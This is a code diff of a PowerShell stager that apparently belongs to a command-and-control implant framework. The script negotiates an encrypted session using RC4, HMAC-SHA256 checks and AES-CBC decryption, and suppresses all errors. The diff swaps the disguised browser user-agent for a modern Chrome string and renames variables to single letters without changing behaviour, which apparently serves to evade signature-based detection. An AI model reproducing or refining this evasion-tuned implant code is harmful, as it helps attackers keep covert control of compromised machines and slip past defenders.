@@ -10,61 +10,59 @@
 {% include 'http/comms.ps1' %}
 
 function Start-Negotiate {
-    param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',$hop)
-
+    param($s,$SK,$UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',$hop)
     function ConvertTo-RC4ByteStream {
-        Param ($RCK, $In)
-        begin {
-            [Byte[]] $Str = 0..255;
-            $J = 0;
-            0..255 | ForEach-Object {
-                $J = ($J + $Str[$_] + $RCK[$_ % $RCK.Length]) % 256;
-                $Str[$_], $Str[$J] = $Str[$J], $Str[$_];
-            };
-            $I = $J = 0;
-        }
+        Param ($K, $Data)
         process {
-            ForEach($Byte in $In) {
-                $I = ($I + 1) % 256;
-                $J = ($J + $Str[$I]) % 256;
-                $Str[$I], $Str[$J] = $Str[$J], $Str[$I];
-                $Byte -bxor $Str[($Str[$I] + $Str[$J]) % 256];
+            ForEach ($Byte in $Data) {
+                $i = ($i + 1) % 256
+                $j = ($j + $S[$i]) % 256
+                $S[$i], $S[$j] = $S[$j], $S[$i]
+                $Byte -bxor $S[($S[$i] + $S[$j]) % 256]
             }
         }
+        begin {
+            [Byte[]] $S = 0..255
+            $j = 0
+            0..255 | ForEach-Object {
+                $j = ($j + $S[$_] + $K[$_ % $K.Length]) % 256
+                $S[$_], $S[$j] = $S[$j], $S[$_]
+            }
+            $i = $j = 0
+        }
     }
+    
 
     function Decrypt-Bytes {
-        param ($Key, $In)
-        if($In.Length -gt 32) {
-            $HMAC = New-Object System.Security.Cryptography.HMACSHA256;
-            $e=[System.Text.Encoding]::ASCII;
+        param ($A, $B)
+        if ($B.Length -gt 32) {
+            $C = New-Object System.Security.Cryptography.HMACSHA256
+            $D = [System.Text.Encoding]::ASCII
             # Verify the HMAC
-            $Mac = $In[-10..-1];
-            $In = $In[0..($In.length - 11)];
-            $hmac.Key = $e.GetBytes($Key);
-            $Expected = $hmac.ComputeHash($In)[0..9];
-            if (@(Compare-Object $Mac $Expected -Sync 0).Length -ne 0) {
-                return;
+            $E = $B[-10..-1]
+            $B = $B[0..($B.length - 11)]
+            $C.Key = $D.GetBytes($A)
+            $F = $C.ComputeHash($B)[0..9]
+            if (@(Compare-Object $E $F -Sync 0).Length -ne 0) {
+                return
             }
-
-            # extract the IV
-            $IV = $In[0..15];
-           try {
-                $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+            # Extract the IV
+            $G = $B[0..15]
+            try {
+                $H = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+            } catch {
+                $H = New-Object System.Security.Cryptography.RijndaelManaged
             }
-            catch {
-                $AES=New-Object System.Security.Cryptography.RijndaelManaged;
-            }
-            $AES.Mode = "CBC";
-            $AES.Key = $e.GetBytes($Key);
-            $AES.IV = $IV;
-            ($AES.CreateDecryptor()).TransformFinalBlock(($In[16..$In.length]), 0, $In.Length-16)
+            $H.Mode = "CBC"
+            $H.Key = $D.GetBytes($A)
+            $H.IV = $G
+            ($H.CreateDecryptor()).TransformFinalBlock(($B[16..$B.length]), 0, $B.Length - 16)
         }
-    }
+    }    
 
     # make sure the appropriate assemblies are loaded
-    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Security");
-    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Core");
+    $nope = [Reflection.Assembly]::LoadWithPartialName("System.Security");
+    $nope = [Reflection.Assembly]::LoadWithPartialName("System.Core");
 
     # try to ignore all errors
     $ErrorActionPreference = "SilentlyContinue";
